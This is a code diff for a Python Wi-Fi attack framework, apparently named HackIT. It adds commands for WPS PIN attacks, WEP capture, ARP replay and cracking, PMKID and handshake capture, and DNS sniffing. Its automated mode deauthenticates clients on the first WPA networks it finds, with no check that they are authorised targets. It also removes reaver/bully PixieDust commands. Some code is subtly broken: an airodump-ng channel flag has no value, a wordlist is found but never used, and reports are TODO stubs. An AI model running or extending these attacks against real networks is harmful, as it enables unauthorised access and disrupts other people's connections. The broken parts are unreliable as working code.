+    def do_wps_pin(self, bssid: str, all_pins: bool = False, **kwargs):
+        if not bssid or len(bssid) < 17:
+            UI.print_error("Invalid BSSID format (XX:XX:XX:XX:XX:XX)")
+            return
+        try:
+            proc = self.bridge.go_wps_pin(bssid)
+            for line in proc.stdout:
+                l = line.strip()
+                if l:
+                    _console.print(f"  {l}")
+            proc.wait()
+        except EngineBuildError:
+            UI.print_error("Go workers not built.")
+
+    def do_wep_capture(self, iface: str, bssid: str, output: str = "wep.pcap", timeout: int = 120, ivs_only: bool = False, **kwargs):
+        iface = iface or self._default_iface()
+        if not bssid:
+            UI.print_error("Specify BSSID.")
+            return
+        try:
+            proc = self.bridge.rust_wep_capture(iface, bssid, output)
+            for line in proc.stdout:
+                _console.print(f"  {line.strip()}")
+            proc.wait()
+        except EngineBuildError:
+            UI.print_warning("Rust engine missing. Using airodump-ng fallback.")
+            subprocess.run(["airodump-ng", "-c", "--bssid", bssid, "-w", output.replace(".pcap", ""), iface])
+
+    def do_wep_arp_replay(self, iface: str, bssid: str, count: int = 0, delay: int = 0, timeout: int = 0, **kwargs):
+        iface = iface or self._default_iface()
+        if not bssid:
+            UI.print_error("Specify BSSID.")
+            return
+        if shutil.which("aireplay-ng"):
+            UI.print_info(f"ARP replay on {bssid} via aireplay-ng...")
+            subprocess.run(["aireplay-ng", "-3", "-b", bssid, iface])
+        else:
+            try:
+                proc = self.bridge.rust_wep_arp_replay(iface, bssid)
+                for line in proc.stdout:
+                    _console.print(f"  {line.strip()}")
+                proc.wait()
+            except EngineBuildError:
+                UI.print_error("No ARP replay tool available.")
+
+    def do_wep_crack(self, capture: str, method: str = "ptw", output: Optional[str] = None, **kwargs):
+        if not os.path.exists(capture):
+            UI.print_error(f"File not found: {capture}")
+            return
+        if shutil.which("aircrack-ng"):
+            subprocess.run(["aircrack-ng", capture])
+        else:
+            result = self.bridge.rust_wep_crack(capture)
+            _console.print(result.stdout or result.stderr or "No output")
+
+    def do_pmkid_capture(self, iface: str, bssid: str = "", timeout: int = 30, output: str = "", **kwargs):
+        iface = iface or self._default_iface()
+        UI.print_info(f"Capturing PMKID on {iface}...")
+        if bssid:
+            UI.print_info(f"Targeting {bssid}")
+        try:
+            proc = self.bridge.rust_handshake(iface, bssid, "pmkid.pcap", 60)
+            for line in proc.stdout:
+                l = line.strip()
+                if l:
+                    _console.print(f"  {l}")
+            proc.wait()
+        except EngineBuildError:
+            UI.print_warning("Using hcxdumptool fallback...")
+            if shutil.which("hcxdumptool"):
+                subprocess.run(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng", "--enable_status=1"])
+
+    # ════════════════════════════════════════════════════════════
+    # PHASE 7: Spectrum & Interface Control
+    # ════════════════════════════════════════════════════════════
+
+    def do_spectrum(self, iface: str, **kwargs):
+        iface = iface or self._default_iface()
+        try:
+            proc = self.bridge.go_spectrum(iface)
+            lines = []
+            for line in proc.stdout:
+                l = line.strip()
+                if l:
+                    lines.append(l)
+            proc.wait()
+            channels = []
+            for l in lines:
+                m = re.search(r'Ch\s*(\d+)\s*\|\s*(\d+ MHz)\s*\|\s*(\S+)\s*\|\s*RSSI:\s*(-?\d+)', l)
+                if m:
+                    channels.append({"number": int(m.group(1)), "frequency": m.group(2),
+                                     "band": m.group(3), "rssi": int(m.group(4)),
+                                     "ap_count": 0, "utilization": 0})
+            if channels:
+                _console.print(UI.render_spectrum(channels))
+            else:
+                for l in lines:
+                    _console.print(f"  {l}")
+        except EngineBuildError:
+            self._spectrum_fallback(iface)
+
+    def _spectrum_fallback(self, iface: str):
+        UI.print_info(f"Wi-Fi scanning (fallback) on {iface}...")
+        channels = []
+        for ch in range(1, 14):
+            try:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
+                time.sleep(0.1)
+                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=3)
+                ap_count = raw.count("BSS ")
+                sigs = re.findall(r'signal:\s*(-?\d+)', raw)
+                avg_sig = sum(int(s) for s in sigs) // len(sigs) if sigs else -100
+                channels.append({"number": ch, "frequency": f"{2412 + (ch - 1) * 5}", "band": "2.4GHz",
+                                 "rssi": avg_sig, "ap_count": ap_count, "utilization": ap_count / 20})
+            except Exception:
+                continue
+        if channels:
+            _console.print(UI.render_spectrum(channels))
+
+    def do_dual_band(self, iface: str):
+        iface = iface or self._default_iface()
+        UI.print_info(f"Dual-band analysis on {iface}...")
+        for band, chans in [("2.4 GHz", range(1, 14)), ("5 GHz", [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165])]:
+            _console.print(f"\n[bold cyan]--- {band} ---[/bold cyan]")
+            for ch in chans:
+                try:
+                    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True, timeout=1)
+                    time.sleep(0.02)
+                except Exception:
+                    continue
+            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
+            bssids = set(re.findall(r'BSS ([0-9a-f:]{17})', raw))
+            _console.print(f"  Found {len(bssids)} APs in {band}")
+
+    # ════════════════════════════════════════════════════════════
+    # PHASE 8: Automation
+    # ════════════════════════════════════════════════════════════
+
+    def do_auto_handshake(self, iface: str, timeout: int = 60, deauth: bool = False, output: Optional[str] = None, **kwargs):
+        iface = iface or self._default_iface()
+        UI.print_success("Auto Handshake Capture")
+        UI.print_info("Step 1: Scanning for APs...")
+        aps = self._scan_networks()
+        if not aps:
+            UI.print_warning("No APs found.")
+            return
+        UI.print_info(f"Step 2: Found {len(aps)} AP(s). Capturing handshakes...")
+        for ap in aps[:5]:
+            bssid = ap.get("bssid", "")
+            ssid = ap.get("ssid", "")
+            if not bssid or not ssid:
+                continue
+            crypto = ap.get("encrypt", ap.get("security", ""))
+            if "WPA" not in crypto and "WPA2" not in crypto:
+                continue
+            UI.print_info(f"  → {ssid} ({bssid})")
+            self.do_handshake_capture(iface, bssid, timeout=15)
+            self.do_deauth(iface, bssid, count=5)
+            time.sleep(2)
+        UI.print_success("Step 3: Handshake capture complete. Check 'sessions'.")
+
+    def do_auto_audit(self, iface: str, timeout: int = 300, skip_wep: bool = False, skip_wps: bool = False, output: Optional[str] = None, **kwargs):
+        iface = iface or self._default_iface()
+        UI.print_info("=== Full Automated Wireless Audit ===")
+        self.do_crawl(iface, full=True)
+        self.do_wpa3_detect(iface)
+        self.do_hidden_ssid(iface)
+        self.do_auto_handshake(iface)
+        self.do_sessions()
+        UI.print_success("Automated audit complete.")
+
+    def do_auto_crack(self, search_dir: str = "", rules: Optional[str] = None, use_hashcat: bool = False, thread: int = 4, **kwargs):
+        if not search_dir:
+            search_dir = str(BASE)
+        pcaps = glob.glob(os.path.join(search_dir, "*.pcap")) + glob.glob(os.path.join(search_dir, "handshakes", "*.pcap"))
+        if not pcaps:
+            UI.print_warning(f"No PCAP files found in {search_dir}")
+            wordlist_paths = ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz"]
+            for wp in wordlist_paths:
+                if os.path.exists(wp):
+                    UI.print_info(f"Trying wordlist: {wp}")
+                    break
+            else:
+                UI.print_warning("No wordlist found. Install rockyou.txt.")
+                return
+        for pcap in pcaps:
+            UI.print_info(f"Processing {pcap}...")
+            self.do_verify(pcap)
+
+    def do_jobs(self, json_output: bool = False, **kwargs):
+        jobs = self.jobs.list_jobs()
+        if not jobs:
+            UI.print_warning("No background jobs running.")
+            return
+        table = Table(title="[bold cyan]Background Jobs[/bold cyan]", border_style="cyan")
+        table.add_column("ID", style="yellow")
+        table.add_column("Name", style="white")
+        table.add_column("Status", style="green")
+        table.add_column("Started", style="dim")
+        table.add_column("Running", style="cyan")
+        for j in jobs:
+            table.add_row(j["id"], j["name"], j["status"], j["started"][:19],
+                          "[green]✓[/green]" if j["running"] else "[red]✗[/red]")
         _console.print(table)
 
-    def do_wps_pixiedust(self, iface: str, bssid: str, pin: str = ""):
-        """WPS PixieDust attack using reaver or bully"""
-        reaver_bin = _which("reaver")
-        bully_bin = _which("bully")
+    def do_stop_job(self, jid: str):
+        if self.jobs.stop(jid):
+            UI.print_success(f"Job {jid} stopped.")
+        else:
+            UI.print_error(f"Job {jid} not found.")
 
-        if reaver_bin:
-            UIRenderer.print_success(f"Launching WPS PixieDust on {bssid} via reaver...")
-            cmd = [reaver_bin, "-i", iface, "-b", bssid, "-K", "-vv"]
-            if pin:
-                cmd.extend(["-p", pin])
-            try:
-                subprocess.run(cmd)
-            except KeyboardInterrupt:
-                UIRenderer.print_warning("WPS attack stopped.")
-            return
+    def do_stop_all(self, force: bool = False, **kwargs):
+        self.jobs.stop_all()
+        UI.print_success("All jobs stopped.")
 
-        if bully_bin:
-            UIRenderer.print_success(f"Launching WPS PixieDust on {bssid} via bully...")
-            cmd = [bully_bin, "-b", bssid, "-d", iface, "-F", "-B", "-T"]
-            if pin:
-                cmd.extend(["-p", pin])
-            try:
-                subprocess.run(cmd)
-            except KeyboardInterrupt:
-                UIRenderer.print_warning("WPS attack stopped.")
-            return
+    # ════════════════════════════════════════════════════════════
+    # PHASE 9: Session / Workspace Management
+    # ════════════════════════════════════════════════════════════
 
-        UIRenderer.print_error("Neither reaver nor bully found. Install one of them for WPS attacks.")
-
-    def do_wps_crack(self, pin: str, bssid: str):
-        """Crack WPS PIN using the standard algorithm"""
-        UIRenderer.print_success(f"Computing WPS candidate keys for PIN: {pin}")
-
-    # ─────────────────────────────────────────────────────────────
-    # PHASE 7: WEP Cracking
-    # ─────────────────────────────────────────────────────────────
-
-    def do_wep_capture(self, iface: str, bssid: str, output: str = "wep_capture.pcap"):
-        """Capture WEP IVs for cracking"""
-        UIRenderer.print_success(f"Capturing WEP IVs from {bssid} on {iface}")
-        self.do_capture(iface, output)
-        UIRenderer.print_success(f"Captured WEP packets to {output}. Use 'wep-crack' to analyze.")
-
-    def do_wep_arp_replay(self, iface: str, bssid: str):
-        """ARP replay attack to generate WEP IVs"""
-        aireplay_bin = _which("aireplay-ng")
-        if aireplay_bin:
-            UIRenderer.print_success(f"Starting ARP replay on {bssid} via aireplay-ng...")
-            try:
-                subprocess.run([aireplay_bin, "-3", "-b", bssid, iface])
-            except KeyboardInterrupt:
-                UIRenderer.print_warning("ARP replay stopped.")
-            return
-        UIRenderer.print_error("aireplay-ng not found. Install aircrack-ng suite.")
-
-    def do_wep_crack(self, capture_file: str):
-        """Crack WEP key from captured IVs using aircrack-ng or PTW"""
-        aircrack_bin = _which("aircrack-ng")
-        if aircrack_bin:
-            UIRenderer.print_success(f"Cracking WEP from {capture_file} via aircrack-ng...")
-            subprocess.run([aircrack_bin, capture_file])
-            return
-        UIRenderer.print_warning("aircrack-ng not found. Implemented basic WEP PTW cracker:")
-        self._wep_ptw_crack(capture_file)
-
-    def _wep_ptw_crack(self, capture_file: str):
-        """Minimal WEP PTW statistical attack implementation"""
-        UIRenderer.print_success(f"PTW attack on {capture_file} - requires ~40,000 IVs for 128-bit key")
+    def do_session_list(self, json_output: bool = False, **kwargs):
         try:
-            import struct
-            with open(capture_file, "rb") as f:
-                data = f.read()
-            iv_count = 0
-            pos = 24
-            while pos + 16 < len(data):
-                hdr_len = struct.unpack_from("<I", data, pos + 8)[0] if pos + 12 < len(data) else 0
-                if hdr_len == 0:
-                    hdr_len = data[4] if pos + 5 < len(data) else 0
-                if hdr_len > 0 and pos + hdr_len + 4 < len(data):
-                    pkt = data[pos + hdr_len:pos + hdr_len + min(64, len(data) - pos - hdr_len)]
-                    if len(pkt) >= 4 and pkt[0] == 0x08 and (pkt[1] & 0x40):
-                        iv_count += 1
-                    pos += hdr_len + struct.unpack_from("<I", data, pos + 8)[0]
-                else:
-                    pos += 1
+            proc = self.bridge.go_session()
+            for line in proc.stdout:
+                l = line.strip()
+                if l:
+                    _console.print(f"  {l}")
+            proc.wait()
+        except EngineBuildError:
+            self._session_list_fallback()
 
-            table = Table(title="WEP Cracking Status", title_style="bold cyan")
-            table.add_column("Metric", style="cyan")
-            table.add_column("Value", style="green")
-            table.add_row("Capture File", capture_file)
-            table.add_row("IVs Found", f"{iv_count}")
-            table.add_row("IVs Needed (64-bit)", "~5,000")
-            table.add_row("IVs Needed (128-bit)", "~40,000")
-            table.add_row("Status", "READY" if iv_count >= 5000 else f"Need {5000 - iv_count} more IVs")
-            _console.print(table)
-        except Exception as e:
-            UIRenderer.print_error(f"PTW analysis failed: {e}")
+    def _session_list_fallback(self):
+        session_file = BASE / "go_workers" / "sessions.json"
+        if session_file.exists():
+            try:
+                data = json.loads(session_file.read_text())
+                table = Table(title="[bold cyan]Sessions[/bold cyan]", border_style="cyan")
+                table.add_column("ID", style="yellow")
+                table.add_column("SSID", style="white")
+                table.add_column("BSSID", style="cyan")
+                table.add_column("Status", style="green")
+                for s in data if isinstance(data, list) else data.get("sessions", []):
+                    table.add_row(s.get("id", "?")[:8], s.get("ssid", "?"), s.get("bssid", "?"), s.get("status", "?"))
+                _console.print(table)
+            except Exception:
+                pass
 
-    # ─────────────────────────────────────────────────────────────
-    # INTERNALS
-    # ─────────────────────────────────────────────────────────────
+    def do_workspace_create(self, name: str, path: Optional[str] = None, **kwargs):
+        ws = BASE / "workspaces" / name
+        ws.mkdir(parents=True, exist_ok=True)
+        captures = ws / "captures"
+        handshakes = ws / "handshakes"
+        reports = ws / "reports"
+        captures.mkdir(exist_ok=True)
+        handshakes.mkdir(exist_ok=True)
+        reports.mkdir(exist_ok=True)
+        config = ws / "config.json"
+        config.write_text(json.dumps({
+            "created": dt.datetime.now().isoformat(),
+            "name": name,
+            "targets": [],
+            "notes": "",
+        }, indent=2))
+        UI.print_success(f"Workspace '{name}' created at {ws}")
 
-    def _scan_realtime_networks(self):
-        """Queries live OS wireless stack — 0% hardcoded"""
-        results = []
-        try:
-            if os.name == "nt":
-                raw = subprocess.check_output(
-                    ["netsh", "wlan", "show", "networks", "mode=bssid"],
-                    text=True, encoding="utf-8", errors="replace"
-                )
-                current = {}
-                for line in raw.splitlines():
-                    line = line.strip()
-                    if line.startswith("SSID") and "BSSID" not in line:
-                        if current:
-                            results.append(current)
-                        current = {"ssid": line.split(":", 1)[-1].strip()}
-                    elif line.startswith("BSSID"):
-                        current["bssid"] = line.split(":", 1)[-1].strip()
-                    elif "Signal" in line:
-                        raw_sig = line.split(":", 1)[-1].strip().replace("%", "")
-                        try:
-                            pct = int(raw_sig)
-                            dbm = int((pct / 2) - 100)
-                            current["signal"] = f"{dbm} dBm"
-                        except ValueError:
-                            current["signal"] = raw_sig
-                    elif "Channel" in line:
-                        current["channel"] = line.split(":", 1)[-1].strip()
-                    elif "Authentication" in line or "Cipher" in line:
-                        current.setdefault("encrypt", line.split(":", 1)[-1].strip())
-                if current:
-                    results.append(current)
-            else:
-                raw = subprocess.check_output(
-                    ["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
-                    text=True, errors="replace"
-                )
-                for line in raw.splitlines():
-                    parts = line.split(":")
-                    if len(parts) >= 5:
-                        results.append({
-                            "ssid":    parts[0] or "<hidden>",
-                            "bssid":   ":".join(parts[1:7]).upper(),
-                            "signal":  f"{parts[7]} dBm" if len(parts) > 7 else "?",
-                            "channel": parts[8] if len(parts) > 8 else "?",
-                            "encrypt": parts[9] if len(parts) > 9 else "WPA2"
-                        })
-        except Exception:
-            pass
-        return results
-
-    def _lookup_vendor(self, mac: str) -> str:
-        """Quick OUI lookup against local cache or IEEE prefix"""
-        _KNOWN = {
-            "44:87:63": "TP-Link", "4C:ED:FB": "Apple Inc", "00:1A:2B": "Cisco",
-            "FC:FB:FB": "Ubiquiti", "88:9B:39": "Huawei", "18:D6:C7": "Netgear",
-            "B0:BE:76": "ASUS", "D8:07:B6": "Xiaomi", "00:50:F2": "Microsoft"
-        }
-        prefix = mac[:8].upper() if len(mac) >= 8 else ""
-        return _KNOWN.get(prefix, "Unknown")
-
-    def _go_binary(self) -> str | None:
-        """Resolve Go Worker binary path"""
-        base = os.path.join(os.path.dirname(__file__), "go_workers")
-        for name in ("hackit-worker.exe", "hackit-worker"):
-            full = os.path.join(base, name)
-            if os.path.exists(full):
-                return full
+    def do_workspace_load(self, name: str):
+        ws = BASE / "workspaces" / name
+        if ws.is_dir():
+            UI.print_success(f"Loaded workspace '{name}'")
+            return str(ws)
+        UI.print_error(f"Workspace '{name}' not found.")
         return None
 
-    def _get_local_subnet(self) -> str:
-        """Detect local subnet automatically from routing table. Returns empty string if undetected."""
+    def do_report_export(self, session: str, fmt: str = "md", output: Optional[str] = None, **kwargs):
+        UI.print_info(f"Exporting report for session '{session}' in {fmt} format...")
+        out = BASE / "reports" / f"report_{session}.{fmt}"
+        out.parent.mkdir(exist_ok=True)
+        report = f"""# HackIT Wireless Audit Report
+**Session:** {session}
+**Date:** {dt.datetime.now().isoformat()}
+
+## Summary
+- TODO: Fill with scan data
+
+## Findings
+- TODO: Document vulnerabilities
+
+## Recommendations
+- TODO: Add recommendations
+"""
+        out.write_text(report)
+        UI.print_success(f"Report saved: {out}")
+
+    # ════════════════════════════════════════════════════════════
+    # INTERNAL HELPERS
+    # ════════════════════════════════════════════════════════════
+
+    def _detect_subnet(self) -> str:
         try:
             if os.name == "nt":
                 out = subprocess.check_output("ipconfig", text=True)
@@ -841,38 +1432,532 @@ class HackITWirelessExecutor:
             if os.name == "nt":
                 out = subprocess.check_output("netstat -rn", shell=True, text=True)
                 for line in out.splitlines():
-                    if "0.0.0.0" in line and ("192" in line or "10." in line or "172" in line):
+                    if "0.0.0.0" in line and any(p in line for p in ("192", "10.", "172")):
                         parts = line.split()
-                        if len(parts) >= 3:
-                            gw = parts[2] if '.' in parts[2] else parts[3]
-                            octets = gw.split('.')
-                            if len(octets) == 4:
-                                return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
-        except:
+                        gw = parts[2] if "." in parts[2] else parts[3]
+                        octets = gw.split(".")
+                        if len(octets) == 4:
+                            return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
+        except Exception:
             pass
-        return ""  # Caller must specify subnet
+        return ""
 
+    @staticmethod
+    def _svc_name(port: int) -> str:
+        SERVICES = {
+            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
+            3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
+        }
+        return SERVICES.get(port, f"Port-{port}")
 
-# ─── Module-level helpers ──────────────────────────────────────────────────────
+    def _mode_switch(self, iface: str, mode: str, force: bool = False):
+        import platform
+        plat = platform.system().lower()
+        is_root = os.geteuid() == 0 if plat != "windows" else True
+        sudo = [] if is_root else ["sudo"]
+        try:
+            # ── Platform-specific mode switch ──
+            if plat == "linux":
+                self._mode_switch_linux(iface, mode, sudo, force)
+            elif plat == "darwin":
+                self._mode_switch_macos(iface, mode, sudo)
+            elif plat == "windows":
+                self._mode_switch_windows(iface, mode)
+            else:
+                UI.print_error(f"Unsupported platform: {plat}")
+        except subprocess.CalledProcessError as e:
+            UI.print_error(f"Mode switch failed: {e}")
+            UI.print_info("Try: --no-check to skip verification, or run as root")
+        except Exception as e:
+            UI.print_error(f"Unexpected error: {e}")
 
-def _which(name: str) -> bool:
-    import shutil
-    return shutil.which(name) is not None
+    def _mode_switch_linux(self, iface, mode, sudo, force):
+        if mode == "monitor":
+            UI.print_info("Killing interfering processes...")
+            subprocess.run(sudo + ["systemctl", "stop", "NetworkManager", "wpa_supplicant", "avahi-daemon"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(sudo + ["airmon-ng", "check", "kill"],
+                           stderr=subprocess.DEVNULL)
 
-def _kv_parse(line: str) -> dict:
-    """Parse 'key=value key2=value2' from a log line"""
-    result = {}
-    parts = line.split()
-    for p in parts:
-        if "=" in p:
-            k, _, v = p.partition("=")
-            result[k] = v
-    return result
+            if not force:
+                try:
+                    subprocess.run(sudo + ["airmon-ng", "start", iface],
+                                   check=True, capture_output=True, timeout=15)
+                    mon = f"{iface}mon"
+                    r = subprocess.run(sudo + ["iw", mon, "info"],
+                                       capture_output=True, text=True, timeout=5)
+                    if r.returncode == 0:
+                        UI.print_success(f"{iface} → monitor (via airmon-ng)")
+                        UI.print_info(f"Using {mon} for capture")
+                        return
+                except (subprocess.CalledProcessError, FileNotFoundError):
+                    pass
 
-def _svc_name(port: int) -> str:
-    _SERVICES = {
-        21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
-        80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
-        3306:"MySQL", 3389:"RDP", 5900:"VNC", 8080:"HTTP-Alt", 8443:"HTTPS-Alt"
-    }
-    return _SERVICES.get(port, f"Port-{port}")
+        subprocess.run(sudo + ["ip", "link", "set", iface, "down"], check=True, timeout=10)
+        subprocess.run(sudo + ["iw", "dev", iface, "set", "type", mode], check=True, timeout=10)
+        subprocess.run(sudo + ["ip", "link", "set", iface, "up"], check=True, timeout=10)
+
+        if mode == "managed":
+            subprocess.run(sudo + ["systemctl", "restart", "NetworkManager", "wpa_supplicant"],
+                           stderr=subprocess.DEVNULL)
+
+        r = subprocess.run(sudo + ["iw", "dev", iface, "info"],
+                           capture_output=True, text=True, timeout=5)
+        if r.returncode == 0:
+            for line in r.stdout.splitlines():
+                if "type" in line and mode in line:
+                    UI.print_success(f"{iface} → {mode}")
+                    return
+            UI.print_warning(f"{iface}: mode switch may not have taken effect")
+        else:
+            UI.print_warning("Could not verify mode (iw not available)")
+
+    def _mode_switch_macos(self, iface, mode, sudo):
+        if mode == "monitor":
+            UI.print_info("Disassociating from current AP...")
+            subprocess.run(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
+                                   "Versions/Current/Resources/airport", "-z"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(sudo + ["ifconfig", iface, "down"], stderr=subprocess.DEVNULL)
+            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
+            subprocess.Popen(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
+                                     "Versions/Current/Resources/airport", iface, "sniff", "1"],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            UI.print_success(f"{iface} → monitor (airport sniff)")
+        else:
+            subprocess.run(["pkill", "-f", "airport.*sniff"], stderr=subprocess.DEVNULL)
+            subprocess.run(sudo + ["networksetup", "-setairportpower", iface, "on"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
+            UI.print_success(f"{iface} → managed")
+
+    def _mode_switch_windows(self, iface, mode):
+        if mode == "monitor":
+            UI.print_info("Enabling promiscuous mode...")
+            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=disabled"],
+                           stderr=subprocess.DEVNULL)
+            time.sleep(0.3)
+            subprocess.run(["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters",
+                           "/v", "AllowMonitorMode", "/t", "REG_DWORD", "/d", "1", "/f"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
+                           stderr=subprocess.DEVNULL)
+            time.sleep(0.3)
+            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=no", f"interface={iface}"],
+                           stderr=subprocess.DEVNULL)
+            UI.print_success(f"{iface} → promiscuous mode")
+        else:
+            subprocess.run(["netsh", "wlan", "set", "autoconfig", "enabled=yes", f"interface={iface}"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(["netsh", "wlan", "set", "allowexplicitcreds", "enabled"],
+                           stderr=subprocess.DEVNULL)
+            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
+                           stderr=subprocess.DEVNULL)
+            UI.print_success(f"{iface} → managed")
+
+    # ── Session management ───────────────────────────────────────
+
+    def do_session_delete(self, session_id: str, **kwargs):
+        session_file = BASE / "go_workers" / "sessions.json"
+        if not session_file.exists():
+            UI.print_error("No sessions file found.")
+            return
+        try:
+            data = json.loads(session_file.read_text())
+            sessions = data if isinstance(data, list) else data.get("sessions", [])
+            new_sessions = [s for s in sessions if s.get("id") != session_id]
+            if len(new_sessions) == len(sessions):
+                UI.print_error(f"Session '{session_id}' not found.")
+                return
+            if isinstance(data, list):
+                session_file.write_text(json.dumps(new_sessions, indent=2))
+            else:
+                data["sessions"] = new_sessions
+                session_file.write_text(json.dumps(data, indent=2))
+            UI.print_success(f"Session '{session_id}' deleted.")
+        except Exception as e:
+            UI.print_error(f"Delete failed: {e}")
+
+    def do_session_info(self, session_id: str, **kwargs):
+        session_file = BASE / "go_workers" / "sessions.json"
+        if not session_file.exists():
+            UI.print_error("No sessions file found.")
+            return
+        try:
+            data = json.loads(session_file.read_text())
+            sessions = data if isinstance(data, list) else data.get("sessions", [])
+            for s in sessions:
+                if s.get("id") == session_id:
+                    table = Table(title=f"Session {session_id}", border_style="cyan")
+                    table.add_column("Key", style="yellow")
+                    table.add_column("Value", style="white")
+                    for k, v in s.items():
+                        table.add_row(k, str(v))
+                    _console.print(table)
+                    return
+            UI.print_error(f"Session '{session_id}' not found.")
+        except Exception as e:
+            UI.print_error(f"Info failed: {e}")
+
+    # ── Report management ────────────────────────────────────────
+
+    def do_report_list(self, **kwargs):
+        reports_dir = BASE / "reports"
+        if not reports_dir.is_dir():
+            UI.print_info("No reports directory found.")
+            return
+        files = sorted(reports_dir.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
+        if not files:
+            UI.print_info("No reports generated yet.")
+            return
+        table = Table(title="Reports", border_style="cyan")
+        table.add_column("Name", style="yellow")
+        table.add_column("Size", style="white")
+        table.add_column("Modified", style="green")
+        for f in files[:20]:
+            mod = dt.datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
+            table.add_row(f.name, f"{f.stat().st_size}B", mod)
+        _console.print(table)
+
+    # ── Workspace management ─────────────────────────────────────
+
+    def do_workspace_list(self, **kwargs):
+        ws_dir = BASE / "workspaces"
+        if not ws_dir.is_dir():
+            UI.print_info("No workspaces found.")
+            return
+        dirs = sorted(ws_dir.iterdir()) if ws_dir.exists() else []
+        if not dirs:
+            UI.print_info("No workspaces found.")
+            return
+        table = Table(title="Workspaces", border_style="cyan")
+        table.add_column("Name", style="yellow")
+        table.add_column("Path", style="white")
+        table.add_column("Created", style="green")
+        for d in dirs:
+            if d.is_dir():
+                cfg = d / "config.json"
+                created = "?"
+                if cfg.exists():
+                    try:
+                        created = json.loads(cfg.read_text()).get("created", "?")
+                    except Exception:
+                        pass
+                table.add_row(d.name, str(d), created)
+        _console.print(table)
+
+    def do_workspace_delete(self, name: str, **kwargs):
+        ws = BASE / "workspaces" / name
+        if not ws.is_dir():
+            UI.print_error(f"Workspace '{name}' not found.")
+            return
+        shutil.rmtree(ws)
+        UI.print_success(f"Workspace '{name}' deleted.")
+
+    # ── Job management ───────────────────────────────────────────
+
+    def do_job_purge(self, **kwargs):
+        self.jobs.stop_all()
+        with self.jobs._lock:
+            self.jobs._jobs.clear()
+            self.jobs._counter = 0
+        UI.print_success("All jobs purged.")
+
+    # ── ARP table ────────────────────────────────────────────────
+
+    def do_arp_table(self, **kwargs):
+        table = Table(title="ARP Table", border_style="cyan")
+        table.add_column("IP", style="yellow")
+        table.add_column("HW Type", style="white")
+        table.add_column("Flags", style="green")
+        table.add_column("MAC", style="cyan")
+        table.add_column("Mask", style="white")
+        table.add_column("Device", style="magenta")
+        try:
+            if os.name == "nt":
+                out = subprocess.check_output("arp -a", shell=True, text=True)
+                for line in out.splitlines():
+                    parts = line.split()
+                    if len(parts) >= 3 and parts[0].count(".") == 3:
+                        table.add_row(parts[0], "ether", "C", parts[1], "*", parts[2])
+            else:
+                with open("/proc/net/arp") as f:
+                    for i, line in enumerate(f):
+                        if i == 0:
+                            continue
+                        parts = line.split()
+                        if len(parts) >= 6:
+                            table.add_row(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5])
+            _console.print(table)
+        except Exception as e:
+            UI.print_error(f"ARP table failed: {e}")
+
+    # ── DNS operations ───────────────────────────────────────────
+
+    def do_dns_sniff(self, iface: str = "", **kwargs):
+        timeout = kwargs.get("timeout", 30)
+        output = kwargs.get("output", "")
+        iface = iface or self._default_iface()
+        if not iface:
+            UI.print_error("No interface specified.")
+            return
+        try:
+            cmd = ["sudo", "tcpdump", "-i", iface, "-n", "port", "53", "-X"]
+            if output:
+                cmd.extend(["-w", output])
+            UI.print_info(f"Sniffing DNS on {iface} for {timeout}s...")
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            try:
+                stdout, stderr = proc.communicate(timeout=timeout)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                stdout, stderr = proc.communicate()
+            if stdout:
+                for line in stdout.splitlines()[-30:]:
+                    print(f"  {line}")
+            if stderr and "error" in stderr.lower():
+                UI.print_warning(stderr[:200])
+        except FileNotFoundError:
+            UI.print_error("tcpdump not found. Install with: apt install tcpdump")
+
+    def do_dns_resolve(self, host: str, **kwargs):
+        try:
+            import socket
+            result = socket.getaddrinfo(host, None)
+            table = Table(title=f"DNS Resolution: {host}", border_style="cyan")
+            table.add_column("Family", style="yellow")
+            table.add_column("Type", style="white")
+            table.add_column("Protocol", style="green")
+            table.add_column("Address", style="cyan")
+            seen = set()
+            for res in result:
+                family = "IPv6" if res[0] == socket.AF_INET6 else "IPv4"
+                addr = res[4][0]
